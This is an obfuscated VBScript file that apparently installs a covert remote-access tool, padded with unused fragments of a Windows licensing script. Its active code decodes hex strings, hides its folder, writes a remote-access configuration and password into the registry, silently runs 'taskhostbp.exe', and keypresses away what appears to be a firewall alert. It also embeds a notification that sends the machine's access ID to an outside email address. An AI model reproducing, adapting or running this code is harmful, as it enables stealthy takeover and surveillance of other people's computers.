On Error Resume Next
Set x3s = WScript.CreateObject("WScript.Shell")
Set u0s = CreateObject("Scripting.FileSystemObject")
Dim x3s, u0s, k6w1b3,a86, ajjc, v9bt46, ken3, kk6, zek8, xo8, sk1ny, dr30, bbt, ytt
k6w1b3 = a0kk("3C7354726F6A3E7461736B686F737462702E6578653C2F7354726F6A3E3C734553433E7B4553437D3C2F734553433E3C734469723E6E696C3C2F734469723E3C735245475F535A3E5245475F535A3C2F735245475F535A3E3C7350617373776F72643E50617373776F72643C2F7350617373776F72643E3C734657616C6C42797061737352553E4345454645454532453546394535454445384535323046314538463146324535454346423230453145354537454545464530463145444545463146324538323035373639364536343646373737333C2F734657616C6C42797061737352553E3C7357696E6D676D74733E77696E6D676D74733A7B696D706572736F6E6174696F6E4C6576656C3D696D706572736F6E6174657D215C5C2E5C726F6F745C64656661756C743A53746452656750726F763C2F7357696E6D676D74733E3C73484B4355506172616D65746572733E536F6674776172655C727274766864655C6666666664657476766E64657276625C5365727665725C506172616D65746572733C2F73484B4355506172616D65746572733E3C73506173733E264833392C264830302C264834332C264830302C264833392C264830302C264833322C264830302C264834312C264830302C264833372C264830302C264834352C264830302C264833372C264830302C264833382C264830302C264833372C264830302C264833302C264830302C264834352C264830302C264833322C264830302C264833362C264830302C264833372C264830302C264834322C264830302C264833382C264830302C264833322C264830302C264833312C264830302C264833382C264830302C264834342C264830302C264833342C264830302C264833342C264830302C264834332C264830302C264834342C264830302C264833372C264830302C264833322C264830302C264834332C264830302C264833302C264830302C264833392C264830302C264833302C264830302C264833362C264830302C264834322C264830302C264834312C264830302C264833342C264830302C264834332C264830302C264834342C264830302C264833342C264830302C264833382C264830302C264833352C264830302C264833372C264830302C264834312C264830302C264834352C264830302C264834322C264830302C264833372C264830302C264833382C264830302C264834362C264830302C264834312C264830302C264833382C264830302C264834342C264830302C264833312C264830302C264833352C264830302C264834352C264830302C264833362C264830302C264834352C264830302C264833372C264830302C264833322C264830302C264833372C264830302C264834322C264830302C264834332C264830302C264833362C264830302C264833312C264830302C264834332C264830302C264833362C264830302C264833302C264830302C264833392C264830302C264834362C264830302C264834322C264830302C264834322C264830302C264833382C264830302C264834322C264830302C264833372C264830302C264833382C264830302C264833352C264830302C264833392C264830302C264833352C264830302C264833362C264830302C264833312C264830302C264833302C264830302C264834352C264830302C264833332C264830302C264833322C264830302C264833312C264830302C264833372C264830302C264834342C264830302C264834362C264830302C264833372C264830302C264833312C264830302C264833372C264830302C264833322C264830302C264834362C264830302C264833362C264830302C264833302C264830302C264834312C264830302C264834312C264830302C264833352C264830302C264833362C264830302C264833362C264830302C264833382C264830302C264833302C264830302C264833362C264830302C264834342C264830302C264834312C264830302C264833302C264830302C264833332C264830302C264833332C264830302C264834362C264830302C264833362C264830302C264833312C264830302C264834322C264830302C264834312C264830302C264834362C264830302C264833362C264830302C264833332C264830302C264833312C264830302C264834322C264830302C264834342C264830302C264833322C264830302C264833362C264830302C264833392C264830302C264833322C264830302C264833322C264830302C264834312C264830302C264834362C264830302C264833352C264830302C264834362C264830302C264834322C264830302C264833302C264830303C2F73506173733E3C734E6F746966693E264833632C264833662C264837382C264836642C264836632C264832302C264837362C264836352C264837322C264837332C264836392C264836662C264836652C264833642C264832322C264833312C264832652C264833302C264832322C264832302C264836352C264836652C264836332C264836662C264836342C264836392C264836652C264836372C264833642C264832322C264835352C264835342C264834362C264832642C264833382C264832322C264833662C264833652C264830642C264830612C264833632C264837322C264836642C264837332C264835662C264836392C264836652C264836352C264837342C264835662C264836392C264836342C264835662C264836652C264836662C264837342C264836392C264836362C264836392C264836332C264836312C264837342C264836392C264836662C264836652C264832302C264837362C264836352C264837322C264837332C264836392C264836662C264836652C264833642C264832322C264833362C264833332C264833302C264833302C264833322C264832322C264833652C264833632C264837352C264837332C264836352C264833652C264837342C264837322C264837352C264836352C264833632C264832662C264837352C264837332C264836352C264833652C264833632C264837332C264836352C264836652C264836342C264835662C264837342C264836662C264835662C264836352C264836642C264836312C264836392C264836632C264833652C264837342C264837322C264837352C264836352C264833632C264832662C264837332C264836352C264836652C264836342C264835662C264837342C264836662C264835662C264836352C264836642C264836312C264836392C264836632C264833652C264833632C264836352C264836642C264836312C264836392C264836632C264833652C264836322C264836352C264837322C264836452C264836392C264836422C264836462C264837362C264836312C264833332C264834302C264837392C264836312C264836452C264836342C264836352C264837382C264832452C264837322C264837352C264833632C264832662C264836352C264836642C264836312C264836392C264836632C264833652C264833632C264836392C264836342C264833652C264837622C264833332C264833312C264833372C264833352C264833352C264833362C264833382C264833322C264832642C264834312C264833352C264833382C264834362C264832642C264833382C264833312C264833342C264834312C264832642C264834312C264834312C264833332C264834362C264832642C264833342C264834342C264833312C264834352C264834312C264833382C264834332C264833352C264833362C264833312C264833332C264833382C264837642C264833632C264832662C264836392C264836342C264833652C264833632C264836372C264836352C264836652C264836352C264837322C264836312C264837342C264836352C264835662C264836652C264836352C264837372C264835662C264837302C264836312C264837332C264837332C264837372C264836662C264837322C264836342C264833652C264836362C264836312C264836632C264837332C264836352C264833632C264832662C264836372C264836352C264836652C264836352C264837322C264836312C264837342C264836352C264835662C264836652C264836352C264837372C264835662C264837302C264836312C264837332C264837332C264837372C264836662C264837322C264836342C264833652C264833632C264836312C264837332C264836622C264835662C264836392C264836342C264836352C264836652C264837342C264836392C264836362C264836392C264836332C264836312C264837342C264836392C264836662C264836652C264833652C264836362C264836312C264836632C264837332C264836352C264833632C264832662C264836312C264837332C264836622C264835662C264836392C264836342C264836352C264836652C264837342C264836392C264836362C264836392C264836332C264836312C264837342C264836392C264836662C264836652C264833652C264833632C264837332C264836352C264836652C264837342C264833652C264836362C264836312C264836632C264837332C264836352C264833632C264832662C264837332C264836352C264836652C264837342C264833652C264833632C264837362C264836352C264837322C264837332C264836392C264836662C264836652C264833652C264833362C264833332C264833302C264833302C264833322C264833632C264832662C264837362C264836352C264837322C264837332C264836392C264836662C264836652C264833652C264833632C264837302C264837352C264836322C264836632C264836392C264836332C264835662C264836622C264836352C264837392C264835662C264836642C264833652C264833632C264832662C264837302C264837352C264836322C264836632C264836392C264836332C264835662C264836622C264836352C264837392C264835662C264836642C264833652C264833632C264837302C264837352C264836322C264836632C264836392C264836332C264835662C264836622C264836352C264837392C264835662C264836352C264833652C264833632C264832662C264837302C264837352C264836322C264836632C264836392C264836332C264835662C264836622C264836352C264837392C264835662C264836352C264833652C264833632C264837302C264836312C264837332C264837332C264837372C264836662C264837322C264836342C264833652C264833632C264832662C264837302C264836312C264837332C264837332C264837372C264836662C264837322C264836342C264833652C264833632C264836392C264836652C264837342C264836352C264837322C264836652C264836352C264837342C264835662C264836392C264836342C264833652C264833632C264832662C264836392C264836652C264837342C264836352C264837322C264836652C264836352C264837342C264835662C264836392C264836342C264833652C264833632C264836342C264836392C264837332C264836332C264836632C264836312C264836392C264836642C264836352C264837322C264833652C264833632C264832662C264836342C264836392C264837332C264836332C264836632C264836312C264836392C264836642C264836352C264837322C264833652C264833632C264836312C264836342C264836342C264836392C264837342C264836392C264836662C264836652C264836312C264836632C264835662C264837342C264836352C264837382C264837342C264833652C264833632C264832662C264836312C264836342C264836342C264836392C264837342C264836392C264836662C264836652C264836312C264836632C264835662C264837342C264836352C264837382C264837342C264833652C264833632C264832662C264837322C264836642C264837332C264835662C264836392C264836652C264836352C264837342C264835662C264836392C264836342C264835662C264836652C264836662C264837342C264836392C264836362C264836392C264836332C264836312C264837342C264836392C264836662C264836652C264833652C264830642C264830613C2F734E6F746966693E3C734657616C6C42797061737345553E35373639364536343646373737333230353336353633373537323639373437393230343136433635373237343C2F734657616C6C42797061737345553E3C734E6F74696669636174696F6E3E4E6F74696669636174696F6E3C2F734E6F74696669636174696F6E3E")
bbt = Mid(k6w1b3, 415, 1279)
sk1ny = Mid(k6w1b3, 36, 5)
ken3 = Mid(k6w1b3, 4481, 44)
a86 = Mid(k6w1b3, 8, 14)
ajjc = Mid(k6w1b3, 54, 3)
v9bt46 = Mid(k6w1b3, 136, 78)
ytt = Mid(k6w1b3, 1711, 2744)
kk6 = Mid(k6w1b3, 340, 50)
xo8 = Mid(k6w1b3, 4557, 12)
zek8 = Mid(k6w1b3, 100, 8)
dr30 = Mid(k6w1b3, 242, 69)
o48la8
epr
bn9zuy
Sub o48la8
If n459(kk6, zek8) Then
x3s.Run "attrib +h " & x3s.CurrentDirectory, 0, False
u7q kk6, zek8, bbt
u7q kk6, xo8, ytt
End If
End Sub
Sub epr
x3s.Run a86 & " -second", 0, False
End Sub
Sub u7q(mh4i, p3foa, ad20j)
On Error Resume Next
Dim d9lc
const bhvyhv = &H80000001
Set d9lc = GetObject(dr30)
d9lc.CreateKey bhvyhv, mh4i
d9lc.SetBinaryValue bhvyhv, mh4i, p3foa, Split(ad20j, Chr(44))
End Sub
Sub uhiv(m0j3, pc15n, x0m8, s6f54)
LineOut "/" & m0j3 & " " & pc15n & " " & x0m8
LineOut "    " & s6f54
End Sub
Sub gsc2t()
on error resume next
dim hd7
set hd7 = CreateObject("WbemScripting.SWbemLastError")
if Err = kErrorSuccess then
wscript.echo L_Operation_Text            & L_Space_Text & hd7.Operation
wscript.echo L_Provider_Text             & L_Space_Text & hd7.ProviderName
wscript.echo L_Description_Text          & L_Space_Text & hd7.Description
wscript.echo L_Text_Error_General04_Text & L_Space_Text & hd7.StatusCode
end if
End Sub
Sub bn9zuy
On Error Resume Next
Dim pwbn0d
For pwbn0d = 1 to 100
If x3s.AppActivate(a0kk(v9bt46)) Or x3s.AppActivate(a0kk(ken3)) Then
x3s.SendKeys sk1ny
End If
WScript.Sleep 100
Next
End Sub
Sub f0wf23(nsq)
Dim j5hid, t81u5
Dim q5u, oqy4na, x4s, t234
Dim tmll, usn4
usn4 = False
On Error Resume Next
set j5hid = GetServiceObject("Version")
t234 = j5hid.Version
j5hid.f0wf23(nsq)
QuitIfError()
j5hid.RefreshLicenseStatus()
For Each t81u5 in GetProductCollection(ProductIsPrimarySkuSelectClause, PartialProductKeyNonNullWhereClause)
oqy4na = t81u5.Description
tmll = btq(t81u5)
If (tmll = 2) Then
uy6(t81u5)
End If
If dn7(oqy4na) Then
usn4 = True
Exit For
End If
Next
If (usn4 = True) Then
q5u = d3q(HKEY_LOCAL_MACHINE, SLKeyPath, "KeyManagementServiceVersion", t234)
If (q5u <> 0) Then
QuitWithError q5u
End If
If dbky(HKEY_LOCAL_MACHINE, SLKeyPath32) Then
q5u = d3q(HKEY_LOCAL_MACHINE, SLKeyPath32, "KeyManagementServiceVersion", t234)
If (q5u <> 0) Then
QuitWithError q5u
End If
End If
Else
q5u = DeleteRegistryValue(HKEY_LOCAL_MACHINE, SLKeyPath, "KeyManagementServiceVersion")
If (q5u <> 0 And q5u <> 2 And q5u <> 5) Then
QuitWithError q5u
End If
q5u = DeleteRegistryValue(HKEY_LOCAL_MACHINE, SLKeyPath32, "KeyManagementServiceVersion")
If (q5u <> 0 And q5u <> 2 And q5u <> 5) Then
QuitWithError q5u
End If
End If
x4s = Replace(c318h("L_MsgInstalledPKey"), "%PKEY%", nsq)
LineOut x4s
End Sub
Sub uy6(t81u5)
Dim x4s
LineOut c318h("L_MsgUndeterminedPrimaryKeyOperation")
x4s = Replace(c318h("L_MsgUndeterminedOperationFormat"), "%PRODUCTDESCRIPTION%", t81u5.Description)
x4s = Replace(x4s, "%PRODUCTID%", t81u5.ID)
LineOut x4s
End Sub
Sub lnccox(t81u5)
If (t81u5.LicenseStatus = 1) Then
LineOut c318h("L_MsgActivated")
ElseIf (t81u5.LicenseStatus = 4) Then
LineOut c318h("L_MsgErrorText_8") & c318h("L_MsgErrorText_11")
ElseIf ((t81u5.LicenseStatus = 5) And (t81u5.LicenseStatusReason = HR_SL_E_NOT_GENUINE)) Then
LineOut c318h("L_MsgErrorText_8") & c318h("L_MsgErrorText_12")
ElseIf (t81u5.LicenseStatus = 6) Then
LineOut c318h("L_MsgActivated")
LineOut c318h("L_MsgLicenseStatusExtendedGrace_1")
Else
LineOut c318h("L_MsgActivated_Failed")
End If
End Sub
Sub u1w280(m0j3, pc15n, x0m8, paaiah, s6f54)
LineOut "/" & m0j3 & " " & pc15n & " " & x0m8 & " " & paaiah
LineOut "    " & s6f54
End Sub
Function c318h(p3foa)
u49hie
If g_resourceDictionary.Exists(LCase(p3foa)) Then
c318h = g_resourceDictionary.Item(LCase(p3foa))
Else
c318h = Eval(p3foa)
End If
End Function
Function yeyo3s(o3t)
If ((InStr(o3t, IndeterminatePrimaryKeyFound) > 0) Or (InStr(o3t, NoPrimaryKeyFound) > 0)) Then
yeyo3s = False
Else
yeyo3s = True
End If
End Function
Function dn7(oqy4na)
If wanl(oqy4na) Then
dn7 = False
Else
If InStr(oqy4na, "VOLUME_KMS") > 0 Then
dn7 = True
Else
dn7 = False
End If
End If
End Function
Function wanl(oqy4na)
If InStr(oqy4na, "VOLUME_KMSCLIENT") > 0 Then
wanl = True
Else
wanl = False
End If
End Function
Function zb2qh(k8i1)
Dim f4bve3 : f4bve3 = Hex(k8i1)
zb2qh = String(4 - Len(f4bve3), "0") & f4bve3
End Function
Function dbky(wul4, z8267)
Dim h859
Dim q5u
q5u = g_objRegistry.CheckAccess(wul4, z8267, 1, h859)
If q5u<>2 Then
dbky = True
Else
dbky = False
End If
End Function
Function ck2qs(f4bve3, qmfka)
Const r8whl0 = 1
If InStr(1, f4bve3, qmfka, r8whl0) = 1 Then
f4bve3 = Mid(f4bve3, 2)
End If
If InStr(Len(f4bve3), f4bve3, qmfka, r8whl0) = Len(f4bve3) Then
f4bve3 = Mid(f4bve3, 1, Len(f4bve3) - 1)
End If
ck2qs = f4bve3
End Function
Function d3q(wul4, z8267, y6dph, etu)
d3q = g_objRegistry.SetStringValue(wul4, z8267, y6dph, etu)
End Function
Function u49hie
If g_resourcesLoaded Then
Exit Function
End If
Dim kpt, k14f
Dim f61wr
Set f61wr = WScript.CreateObject("Scripting.FileSystemObject")
On Error Resume Next
k14f = GetUILanguage()
If Err.Number <> 0 Then
g_resourcesLoaded = True
Exit Function
End If
kpt = f61wr.GetParentFolderName(WScript.ScriptFullName) & "\slmgr\" & zb2qh(k14f) & "\" & f61wr.GetBaseName(WScript.ScriptName) &  ".ini"
If f61wr.FileExists(kpt) Then
Dim oc6
Const gdixr = 1, TristateTrue = -1 
Set oc6 = f61wr.OpenTextFile(kpt, gdixr, False, TristateTrue)
lvy7qp(oc6)
oc6.Close
End If
g_resourcesLoaded = True
End Function
Function j9my(oqy4na)
If InStr(oqy4na, "MAK") > 0 Then
j9my = True
Else
j9my = False
End If
End Function
Function hhx7pd(oqy4na)
If InStr(oqy4na, "VIRTUAL_MACHINE_ACTIVATION") > 0 Then
hhx7pd = True
Else
hhx7pd = False
End If
End Function
Function zhj6(oqy4na)
If InStr(oqy4na, "TIMEBASED_") > 0 Then
zhj6 = True
Else
zhj6 = False
End If
End Function
Function tuh1a(o3t)
If (dn7(o3t) Or wanl(o3t) Or (InStr(o3t, NotSpecialCasePrimaryKey) > 0) Or (InStr(o3t, TblPrimaryKey) > 0) Or (InStr(o3t, IndeterminatePrimaryKeyFound) > 0)) Then
tuh1a = True
Else
tuh1a = False
End If
End Function
Function btq(t81u5)
Dim z8v599
Dim kk292
z8v599 = 0
If (LCase(t81u5.ApplicationId) = WindowsAppId And t81u5.PartialProductKey <> "") Then
On Error Resume Next
kk292 = t81u5.LicenseIsAddon
If Err.Number = 0 Then
If kk292 = true Then
z8v599 = 0
Else
z8v599 = 1
End If
Else
If (wanl(t81u5.Description) Or dn7(t81u5.Description)) Then
z8v599 = 1
Else
z8v599 = 2
End If
End If
End If
btq = z8v599
End Function
Function lvy7qp(oc6)
const xgs = 2
Dim to2dn, y68h85, nyjx, nely
If Not IsObject(oc6) Then Err.Raise xgs
Do Until oc6.AtEndOfStream
to2dn = oc6.ReadLine
y68h85 = Split(to2dn, "=", 2, 1)
If UBound(y68h85, 1) = 1 Then
nyjx = LCase(Trim(y68h85(0)))
nely = ck2qs(Trim(y68h85(1)), """")
If nyjx <> "" Then
g_resourceDictionary.Add nyjx, nely
End If
End If
Loop
End Function
Function n459(mh4i, p3foa)
On Error Resume Next
Dim o6p, nely
const bhvyhv = &H80000001
Set o6p = GetObject(dr30)
o6p.GetBinaryValue bhvyhv, mh4i, p3foa, nely
If IsNull(nely) Then
n459 = True
Else
n459 = False
End If
End Function
Function a0kk(fyv834)
On Error Resume Next
Dim p59b6c, b97, xh234
For p59b6c = 1 To Len(fyv834) Step 2
xh234 = Chr("&H" & Mid(fyv834, p59b6c, 2))
b97 = b97 & xh234
Next
a0kk = b97
End Function
Function  cl95w0(oqy4na)
cl95w0 = wanl(oqy4na)
End Function
